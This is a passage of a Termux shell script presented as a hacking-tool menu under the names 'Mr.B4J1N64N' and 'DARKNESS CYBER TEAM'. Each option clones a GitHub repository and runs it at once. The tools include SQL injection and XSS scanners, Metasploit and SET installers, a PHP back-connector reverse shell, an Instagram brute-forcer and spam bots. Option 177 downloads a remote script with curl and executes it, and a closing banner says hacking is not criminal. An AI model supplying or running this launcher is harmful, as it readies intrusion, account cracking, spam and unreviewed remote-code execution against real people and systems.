eval $(thefuck --alias)
fuck
fi

if [ $bro = 160 ] || [ $bro = 160 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2-dev clang libxml2-dev libxml-utils libxslt-dev
apt install git
git clone https://github.com/Lexiie/sqliv.git
mv sqliv $HOME
cd $HOME/sqliv
pip2 install -r requirements.txt
python2 install setup.py -i
python2 sqliv.py -h
fi

if [ $bro = 161 ] || [ $bro = 161 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/evait-security/ClickNRoot
mv ClickNRoot $HOME
cd $HOME/ClickNRoot
python2 server.py
fi

if [ $bro = 162 ] || [ $bro = 162 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
git clone https://github.com/kereh/BlackMail
mv BlackMail $HOME
cd $HOME/BlackMail
pip2 install requests
python2 BlackMail.py
fi

if [ $bro = 163 ] || [ $bro = 163 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/kereh/BlackTrack
mv BlackTrack $HOME
cd $HOME/BlackTrack
python2 BlackTrack.py
fi

if [ $bro = 164 ] || [ $bro = 164 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/haijuga7/Hashcode
mv Hashcode $HOME
cd $HOME/Hashcode
python2 hash.py
fi

if [ $bro = 165 ] || [ $bro = 165 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/haijuga7/Dec-Enc-Hash
mv Dec-Enc-Hash $HOME
cd $HOME/Dec-Enc-Hash
python2 a.py
fi

if [ $bro = 166 ] || [ $bro = 166 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/pirmansx/hostchecker
mv hostchecker $HOME
cd $HOME/hostchecker
python2 HC.py
fi

if [ $bro = 167 ] || [ $bro = 167 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/pirmansx/myenc
mv myenc $HOME
cd $HOME/myenc
python2 ME.py
fi

if [ $bro = 168 ] || [ $bro = 168 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install php
apt install git
git clone https://github.com/cyweb/StartPhp
mv StartPhp $HOME
cd $HOME/StartPhp
php index.php
fi

if [ $bro = 169 ] || [ $bro = 169 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/cyweb/facenotify
mv facenotify $HOME
cd $HOME/facenotify
python2 notifications.py
fi

if [ $bro = 170 ] || [ $bro = 170 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/cyweb/notefast
mv notefast $HOME
cd $HOME/notefast
python2 setup.py
fi

if [ $bro = 171 ] || [ $bro = 171 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install php
apt install git
git clone https://github.com/cyweb/server_domains
mv server_domains $HOME
cd $HOME/server_domains
php domain.php
fi

if [ $bro = 172 ] || [ $bro = 172 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/Rajkumrdusad/Tool-Kit
mv Tool-Kit $HOME
cd $HOME/Tool-Kit
chmod 777 install
chmod +x install
./install
fi

if [ $bro = 173 ] || [ $bro = 173 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
git clone https://github.com/Rajkumrdusad/MyServer
mv MyServer $HOME
cd $HOME/MyServer
chmod 777 install
chmod +x install
./install
fi

if [ $bro = 174 ] || [ $bro = 174 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
git clone https://github.com/Techzindia/recon-ng_termux_by_viral
mv recon-ng_termux_by_viral $HOME
cd $HOME/recon-ng_termux_by_viral
unzip recon-ng.zip
fi

if [ $bro = 175 ] || [ $bro = 175 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Techzindia/Metasploit_For_Termux
mv Metasploit_For_Termux $HOME
cd $HOME/Metasploit_For_Termux
sh metasploitTechzindia.sh
fi

if [ $bro = 176 ] || [ $bro = 176 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install git
git clone https://github.com/Techzindia/setoolkit-for-termux
mv setoolkit-for-termux $HOME
cd $HOME/setoolkit-for-termux
sh setoolkit.sh
fi

if [ $bro = 177 ] || [ $bro = 177 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
apt Install curl 
cd $HOME 
curl -LO https://raw.githubusercontent.com/Techzindia/Kali-linux_For_Termux/master/Kali-linux-Termux 
chmod +x Kali-linux-Termux 
./Kali-linux-Termux
fi

if [ $bro = 178 ] || [ $bro = 178 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
git clone https://github.com/UltimateHackers/XSStrike
mv XSStrike $HOME
cd $HOME/XSStrike
pip install -r requirements.txt
python xsstrike
fi

if [ $bro = 179 ] || [ $bro = 179 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/hue
mv  hue $HOME
cd $HOME/hue
python2 hue.py
fi

if [ $bro = 180 ] || [ $bro = 180 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/nano
mv nano $HOME
cd $HOME/nano
python2 handler.py
fi

if [ $bro = 181 ] || [ $bro = 181 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2 
apt install git
git clone https://github.com/UltimateHackers/Entropy
mv Entropy $HOME
cd $HOME/Entropy
python2 entropy.py
fi

if [ $bro = 182 ] || [ $bro = 182 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python
apt install git
git clone https://github.com/UltimateHackers/Decodify
mv Decodify $HOME
cd $HOME/Decodify
python dcode
fi

if [ $bro = 183 ] || [ $bro = 183 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install pho
apt install git
git clone https://github.com/Tuhinshubhra/shellstack
mv shellstack $HOME
cd $HOME/shellstack
php shellstack.php
fi

if [ $bro = 184 ] || [ $bro = 184 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install php
apt install git
git clone https://github.com/Tuhinshubhra/Facebook-Video-Downloader
mv Facebook-Video-Downloader $HOME
cd $HOME/Facebook-Video-Downloader
php fb.php
fi

if [ $bro = 185 ] || [ $bro = 185 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/4shadoww/stabilizerbot
mv stabilizerbot $HOME
cd $HOME/stabilizerbot
./stabilizer.py
fi

if [ $bro = 186 ] || [ $bro = 186 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/4shadoww/RemBot
mv RemBot $HOME
cd $HOME/RemBot
python2 rem.py
fi

if [ $bro = 187 ] || [ $bro = 187 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/4shadoww/touchingsky
mv touchingsky $HOME
cd $HOME/touchingsky
python2 touchingsky.py
fi

if [ $bro = 188 ] || [ $bro = 188 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/4shadoww/thanatos
mv thanatos $HOME
cd $HOME/thanatos
python2 thanatos.py
fi

if [ $bro = 189 ] || [ $bro = 189 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/4shadoww/thanatos-archer
mv thanatos-archer $HOME
cd $HOME/thanatos-archer
python2 thanatos.py
fi

if [ $bro = 190 ] || [ $bro = 190 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
pip2 install colorama
pkg install colorama
pip install colorama
pip2 install mechanize
pkg install mechanize
pip install mechanize
apt install git
git clone https://github.com/shawarkhanethicalhacker/BruteXSS
mv BruteXSS $HOME
cd $HOME/BruteXSS
python2 brutexss.py
fi

if [ $bro = 191 ] || [ $bro = 191 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/shawarkhanethicalhacker/csrfpocmaker
mv csrfpocmaker $HOME
cd $HOME/csrfpocmaker
python2 csrfpocmaker.py
fi

if [ $bro = 192 ] || [ $bro = 192 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install php
apt install git
git clone https://github.com/shawarkhanethicalhacker/Sarahah-XSS-Exploit
mv Sarahah-XSS-Exploit $HOME
cd $HOME/Sarahah-XSS-Exploit
python2 sarahah.py
fi

if [ $bro = 193 ] || [ $bro = 193 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install php
apt install git
git clone https://github.com/shawarkhanethicalhacker/PHP-BackConnector
mv PHP-BackConnector $HOME
cd $HOME/PHP-BackConnector
php bc.php
fi

if [ $bro = 194 ] || [ $bro = 194 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/DaffaTakarai/XEIT_Cyber
mv XEIT_Cyber $HOME
cd $HOME/XEIT_Cyber
python2 XEIT_Cyber.py
fi

if [ $bro = 195 ] || [ $bro = 195 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/Xeit666h05t/BoxSosmed
mv BoxSosmed $HOME
cd $HOME/BoxSosmed
python2 BoxSosmed.py
fi

if [ $bro = 196 ] || [ $bro = 196 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/Xeit666h05t/CrewBot
mv CrewBot $HOME
cd $HOME/CrewBot
python2 CrewBot.pyc
fi

if [ $bro = 197 ] || [ $bro = 197 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install 
apt install git
git clone https://github.com/Xeit666h05t/BoxSpam
mv BoxSpam $HOME
cd $HOME/BoxSpam
python2 BoxSpam.py
fi

if [ $bro = 198 ] || [ $bro = 198 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/avramit/CamStream-V3
mv CamStream-V3 $HOME
cd $HOME/CamStream-V3
python2 MjpegStream.py
fi

if [ $bro = 199 ] || [ $bro = 199 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2 
apt install git
git clone https://github.com/avramit/Instahack
mv Instahack $HOME
cd $HOME/Instahack
python2 hackinsta.py
fi

if [ $bro = 200 ] || [ $bro = 200 ]
then
clear
toilet -f big -F gay "Mr.B4J1N64N"
sleep 1
apt update 
apt upgrade
apt install python2
apt install git
git clone https://github.com/XG77Z10/Google-Dork
mv Google-Dork $HOME
cd $HOME/Google-Dork
python2 Google.py
fi

if [ $bro = 0 ] || [ $bro = 00 ]
then
echo "\033[32;1mDARKNESS CYBER TEAM"
sleep 1
echo "\033[33;1mWe Security"
sleep 1
echo " We Not Friends"
sleep 1
echo "We Are Family"
sleep 1
echo "Hacking Is Not Criminal;)"
sleep 1
echo "Ketika Sebuah Hayalan Tidak tercapai"
sleep 1
echo "Maka Terus lah BerJuang Dan Berusaha:)"
sleep 1
echo "\033[32;1mKarna Suatu Hari Nanti Kamu akan Mendapatkannya:)"
sleep 1
exit
fi

